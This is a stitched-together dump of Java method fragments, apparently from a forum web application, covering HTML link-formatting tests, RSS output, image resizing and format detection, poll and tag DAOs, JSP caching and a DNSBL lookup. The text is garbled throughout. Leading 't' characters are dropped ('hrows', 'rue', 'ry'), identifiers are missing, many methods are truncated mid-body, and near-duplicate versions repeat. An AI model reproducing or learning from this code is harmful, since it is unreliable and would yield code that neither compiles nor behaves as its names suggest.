public void estQP ( ) { HTMLFormatter formatter = new HTMLFormatter ( QP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void estEmptyAnchor ( ) { HTMLFormatter formatter = new HTMLFormatter ( EMPTY_ANCHOR ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void estSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; System . out . println ( s2 ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( " " ) ; int lastIndex = s2 . lastIndexOf ( " " ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject , HttpServletRequest request ) hrows Exception { return opics ( groupId , offsetObject , request , false ) ; } 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject , HttpServletRequest request ) hrows Exception { return opics ( groupId , offsetObject , request , rue ) ; } 
protected void renderMergedOutputModel ( Map model , HttpServletRequest request , HttpServletResponse response ) hrows Exception { SyndFeed feed = new SyndFeedImpl ( ) ; feed . setEncoding ( " utf-8 " ) ; String feedType = ( String ) model . get ( " feed-type " ) ; if ( StringUtils . isEmpty ( feedType ) ) { feedType = " rss " ; } feed . setFeedType ( feedTypes . get ( feedType ) ) ; createFeed ( feed , model ) ; response . setContentType ( contentTypes . get ( feedType ) ) ; response . setCharacterEncoding ( " UTF-8 " ) ; SyndFeedOutput output = new SyndFeedOutput ( ) ; output . output ( feed , response . getWriter ( ) ) ; } 
public void estSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( " " ) ; int lastIndex = s2 . lastIndexOf ( " " ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; value = HTMLFormatter . htmlSpecialChars ( value ) ; if ( ! URLUtil . isUrlNoXSS ( value ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
public static boolean isUrlNoXSS ( String x ) { return HTMLFormatter . urlRE . matcher ( x ) . matches ( ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { if ( ! URLUtil . isUrlNoXSS ( m . group ( 1 ) ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
private void initFiles ( String name , String path ) { String mainname = name + " . " + extension ; String iconname = name + " -icon " + " . " + extension ; String medname = name + " -med " + " . " + extension ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
public void copyScreenshotFromPreview ( Template mpl , int msgid ) hrows IOException , UtilException , InterruptedException { initFiles ( Integer . oString ( msgid ) , mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " ) ; doResize ( ) ; } 
private void doResize ( ) hrows IOException , UtilException , InterruptedException { boolean error = rue ; file . renameTo ( mainFile ) ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public void copyScreenshot ( Template mpl , String sessionId ) hrows IOException , UtilException , InterruptedException { initFiles ( sessionId , mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " ) ; doResize ( ) ; } 
public static void resizeImage ( String filename , String iconname , int size ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . oString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { hrow new UtilException ( " Can't convert image: convert failed " ) ; 
private int allocateMsgid ( Connection db ) hrows SQLException { Statement st = null ; ResultSet rs = null ; ry { st = db . createStatement ( ) ; 
private void initFiles ( String name , String path ) { String mainname = name + '.' + extension ; String iconname = name + " -icon " + '.' + extension ; String medname = name + " -med " + '.' + extension ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
private void doResize ( ) hrows IOException , UtilException , InterruptedException { file . renameTo ( mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public int doStartTag ( ) hrows JspException { String cached = ( String ) provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { ry { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public List < ArchiveDaoImpl . ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( ) ; } 
public List < GalleryItem > get ( ) { return galleryDao . getGalleryItems ( ) ; } 
public PollDaoImpl . PollDTO get ( ) { ry { return pollDao . getCurrentPoll ( ) ; 
public List < PollDaoImpl . VoteDTO > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public Integer get ( ) { return pollDao . getVotersCount ( poll . getId ( ) ) ; } 
public List < TagDaoImpl . TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } } ) ; return list ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } 
public Object getFromCache ( String key ) ; public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public PollDTO getCurrentPoll ( ) hrows PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { public PollDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setTopic ( rs . getInt ( " opic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { hrow new PollNotFoundException ( - 1 ) ; } return result ; } 
public PollDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setTopic ( rs . getInt ( " opic " ) ) ; return result ; } 
public PollDTO get ( ) { ry { return pollDao . getCurrentPoll ( ) ; 
public List < VoteDTO > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public int compareTo ( TagDTO o ) { return value . compareTo ( o . value ) ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { @Override public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } } ) ; return list ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " lostpwd-form " ) ; } 
public ModelAndView sendPassword ( @RequestParam ( " nick " ) String nick , @RequestParam ( " email " ) String useremail ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelMap showRemove ( @RequestParam String ag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) hrows AccessViolationException , UtilException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( ag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView showForm ( ) { return new ModelAndView ( " add_comment " ) ; } 
public ModelAndView addComment ( ) { return new ModelAndView ( " add_comment " ) ; } 
public ModelAndView showForm ( @RequestParam ( " opic " ) int opicId , @RequestParam ( value = " replyto " , required = false ) Integer replyTo , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " opic " , opicId ) ; params . put ( " autourl " , rue ) ; params . put ( " mode " , mpl . getFormatMode ( ) ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException { if ( replyTo ! = null ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) { return new ModelAndView ( " delete " , " msgid " , msgid ) ; } 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } return new ModelAndView ( " addphoto " ) ; } 
public static String detectImageType ( File file ) hrows BadImageException , IOException { logger . fine ( " Detecting image type for: " + file + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; ry { is = new FileInputStream ( file ) ; 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static void resizeImage ( String filename , String iconname , int size ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . oString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { logger . warning ( " Failed to convert from " + filename + " to " + iconname ) ; 
public boolean hasGravatar ( ) { return email ! = null ; } 
private void initFiles ( String name , String path ) { String mainname = name + '.' + extension ; String iconname = name + " -icon.jpg " ; String medname = name + " -med.jpg " ; mainFile = new File ( path , mainname ) ; iconFile = new File ( path , iconname ) ; mediumFile = new File ( path , medname ) ; } 
public String getAddInfo ( Connection db ) hrows SQLException { Statement st = null ; ResultSet rs = null ; ry { st = db . createStatement ( ) ; 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public List < Comment > getComments ( boolean reverse , int offset , int limit , Set < Integer > hideSet ) hrows IOException , UtilException , SQLException , UserNotFoundException { return getCommentList ( comments . getList ( ) , reverse , offset , limit , hideSet ) ; } 
public List < Comment > getCommentsSubtree ( int parentId ) hrows IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , null ) ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public PollDTO getCurrentPoll ( ) hrows PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { @Override public PollDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setTopic ( rs . getInt ( " opic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { hrow new PollNotFoundException ( - 1 ) ; } return result ; } 
private void check ( String domain , String msgid ) hrows StorageException { if ( ! DOMAIN_CHECK_RE . isMatch ( domain ) ) { hrow new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . isMatch ( msgid ) ) { hrow new StorageBadMsgidException ( msgid ) ; 
public static Map < Integer , String > getIgnoreListHash ( Connection db , String nick ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public void buildList ( List < Comment > list ) { if ( comment ! = null ) { list . add ( comment ) ; } for ( CommentNode child : childs ) { child . buildList ( list ) ; 
String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) hrows UtilException ; Date getExpire ( ) ; } 
String getVariantID ( ProfileHashtable prof ) hrows UtilException ; Date getExpire ( ) ; } 
Object getFromCache ( String key ) ; < T > boolean storeToCache ( String key , T value , long expire ) ; } 
< T > boolean storeToCache ( String key , T value , long expire ) ; } 
public TagDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { TagDTO result = new TagDTO ( ) ; result . setValue ( rs . getString ( " value " ) ) ; double counter = Math . log ( rs . getInt ( " counter " ) ) ; result . setCounter ( counter ) ; if ( maxc . doubleValue ( ) < counter ) { maxc . setValue ( counter ) ; } if ( minc . doubleValue ( ) < 0 | | counter < minc . doubleValue ( ) ) { minc . setValue ( counter ) ; } return result ; } 
private boolean checkIff ( ) hrows IOException { byte [ ] a = new byte [ 10 ] ; if (read(a, 0, 8) != 8) { 
private boolean checkPng ( ) hrows IOException { byte [ ] PNG_MAGIC = { 0x4e , 0x47 , 0x0d , 0x0a , 0x1a , 0x0a } ; byte [ ] a = new byte [ 27 ] ; if ( read ( a ) ! = 27 ) { return false ; } if ( ! equals ( a , 0 , PNG_MAGIC , 0 , 6 ) ) { return false ; } format = FORMAT_PNG ; width = getIntBigEndian ( a , 14 ) ; height = getIntBigEndian ( a , 18 ) ; bitsPerPixel = a [ 22 ] & 0xff ; int colorType = a [ 23 ] & 0xff ; if ( colorType = = 2 | | colorType = = 6 ) { bitsPerPixel * = 3 ; } progressive = ( a [ 26 ] & 0xff ) ! = 0 ; return rue ; } 
private boolean checkPnm ( int id ) hrows IOException { if ( id < 1 | | id > 6 ) { return false ; } int [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; format = PNM_FORMATS [ ( id - 1 ) % 3 ] ; boolean hasPixelResolution = false ; String s ; while ( rue ) { 
private boolean checkPsd ( ) hrows IOException { byte [ ] a = new byte [ 24 ] ; if ( read ( a ) ! = a . length ) { return false ; } byte [ ] PSD_MAGIC = { 0x50 , 0x53 } ; if ( ! equals ( a , 0 , PSD_MAGIC , 0 , 2 ) ) { return false ; } format = FORMAT_PSD ; width = getIntBigEndian ( a , 16 ) ; height = getIntBigEndian ( a , 12 ) ; int channels = getShortBigEndian ( a , 10 ) ; int depth = getShortBigEndian ( a , 20 ) ; bitsPerPixel = channels * depth ; return ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 64 ) ; } 
private boolean checkRas ( ) hrows IOException { byte [ ] a = new byte [ 14 ] ; if ( read ( a ) ! = a . length ) { return false ; } byte [ ] RAS_MAGIC = { 0x6a , ( byte ) 0x95 } ; if ( ! equals ( a , 0 , RAS_MAGIC , 0 , 2 ) ) { return false ; } format = FORMAT_RAS ; width = getIntBigEndian ( a , 2 ) ; height = getIntBigEndian ( a , 6 ) ; bitsPerPixel = getIntBigEndian ( a , 10 ) ; return ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 24 ) ; } 
private static void printCompact ( String sourceName , ImageInfo2 ImageInfo2 ) { String SEP = " " ; System . out . println ( sourceName + SEP + 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) hrows IOException { FileOutputStream in = new FileOutputStream ( root + domain + '/' + msgid ) ; return in ; } 
private boolean checkPnm ( int id ) hrows IOException { if ( id < 1 | | id > 6 ) { return false ; } int [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; format = PNM_FORMATS [ ( id - 1 ) % 3 ] ; boolean hasPixelResolution = false ; while ( rue ) { 
public List < Comment > getCommentsSubtree ( int parentId ) hrows MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , null ) ; } 
public ModelMap showRemove ( @RequestParam String ag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( ag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) hrows IOException { return new FileOutputStream ( root + domain + '/' + msgid ) ; } 
public void write ( OutputStream df ) hrows IOException { profileHashtable . setObject ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; ObjectOutputStream dof = null ; ry { dof = new ObjectOutputStream ( df ) ; 
public boolean getBoolean ( String prop ) hrows UtilException { if ( settings . get ( prop ) ! = null ) { return ( Boolean ) settings . get ( prop ) ; 
public void addBoolean ( String prop , boolean value ) { settings . put ( prop , value ) ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public int doStartTag ( ) hrows JspException { String cached = ( String ) provider . getFromCache ( key ) ; foundInCache = cached ! = null ; if ( foundInCache ) { ry { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) hrows JspException { if ( ! foundInCache ) { if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( key , result , expire ) ; ry { bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public boolean checkIP ( String addr ) hrows TextParseException { String query = invertIPAddress ( addr ) + '.' + zone ; logger . fine ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
private static String invertIPAddress ( String originalIPAddress ) { StringTokenizer = new StringTokenizer ( originalIPAddress , " . " ) ; String inverted = . nextToken ( ) ; while ( . hasMoreTokens ( ) ) { inverted = . nextToken ( ) + '.' + inverted ; } return inverted ; } 
public void estSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( ' ' ) ; int lastIndex = s2 . lastIndexOf ( ' ' ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
private boolean checkBmp ( ) hrows IOException { byte [ ] a = new byte [ 44 ] ; if ( read ( a ) ! = a . length ) { return false ; } width = getIntLittleEndian ( a , 16 ) ; height = getIntLittleEndian ( a , 20 ) ; if ( width < 1 | | height < 1 ) { return false ; } bitsPerPixel = getShortLittleEndian ( a , 26 ) ; if ( bitsPerPixel ! = 1 & & bitsPerPixel ! = 4 & & bitsPerPixel ! = 8 & & bitsPerPixel ! = 16 & & bitsPerPixel ! = 24 & & bitsPerPixel ! = 32 ) { return false ; } int x = ( int ) ( getIntLittleEndian ( a , 36 ) * 0.0254 ) ; if ( x > 0 ) { physicalHeightDpi = x ; } int y = ( int ) ( getIntLittleEndian ( a , 40 ) * 0.0254 ) ; if ( y > 0 ) { physicalWidthDpi = y ; } format = FORMAT_BMP ; return rue ; } 
private boolean checkPcx ( ) hrows IOException { byte [ ] a = new byte [ 64 ] ; if ( read ( a ) ! = a . length ) { return false ; } if ( a [ 0 ] ! = 1 ) { } 
public static void main ( String [ ] args ) { ImageInfo2 ImageInfo2 = new ImageInfo2 ( ) ; ImageInfo2 . determineNumberOfImages = rue ; boolean verbose = determineVerbosity ( args ) ; if ( args . length = = 0 ) { run ( null , System . in , ImageInfo2 , verbose ) ; 
private static void printVerbose ( String sourceName , ImageInfo2 ii ) { printLine ( 0 , null , sourceName ) ; printLine ( 1 , " File format: " , ii . getFormatName ( ) ) ; printLine ( 1 , " MIME type: " , ii . getMimeType ( ) ) ; printLine ( 1 , " Width (pixels): " , ii . width , 1 ) ; printLine ( 1 , " Height (pixels): " , ii . height , 1 ) ; printLine ( 1 , " Bits per pixel: " , ii . bitsPerPixel , 1 ) ; printLine ( 1 , " Progressive: " , ii . progressive ? " yes " : " no " ) ; printLine ( 1 , " Number of images: " , ii . numberOfImages , 1 ) ; printLine ( 1 , " Physical width (dpi): " , ii . physicalWidthDpi , 1 ) ; printLine ( 1 , " Physical height (dpi): " , ii . physicalHeightDpi , 1 ) ; printLine ( 1 , " Physical width (inches): " , ii . getPhysicalWidthInch ( ) , 1.0f ) ; printLine ( 1 , " Physical height (inches): " , ii . getPhysicalHeightInch ( ) , 1.0f ) ; int numComments = ii . getNumberOfComments ( ) ; printLine ( 1 , " Number of textual comments: " , numComments , 1 ) ; if ( numComments > 0 ) { for ( int i = 0 ; i < numComments ; i + + ) { 
private static void run ( String sourceName , InputStream in , ImageInfo2 ImageInfo2 , boolean verbose ) { ImageInfo2 . setInput ( in ) ; ImageInfo2 . determineNumberOfImages = rue ; ImageInfo2 . collectComments = verbose ; if ( ImageInfo2 . check ( ) ) { print ( sourceName , ImageInfo2 , verbose ) ; 
public void estModification ( ) hrows IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; profile . getHashtable ( ) . setInt ( " messages " , 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) , " est " ) ; } 
protected String readMessageImpl ( String domain , String msgid ) hrows IOException , StorageNotFoundException { BufferedReader in ; ry { in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( root + domain + '/' + msgid ) , " KOI8-R " ) ) ; } catch ( FileNotFoundException e ) { hrow new StorageNotFoundException ( domain , msgid , e ) ; } char [ ] buf = new char [ 8192 ] ; StringBuffer out = new StringBuffer ( ) ; int i ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . oString ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) hrows StorageNotFoundException { FileInputStream in ; TODO: try buffered input stream and check perfomance try { in = new FileInputStream(root + domain + '/' + msgid); } catch (FileNotFoundException e) { throw new StorageNotFoundException(domain, msgid); } return in; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND topics.moderate AND sections.moderate " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN 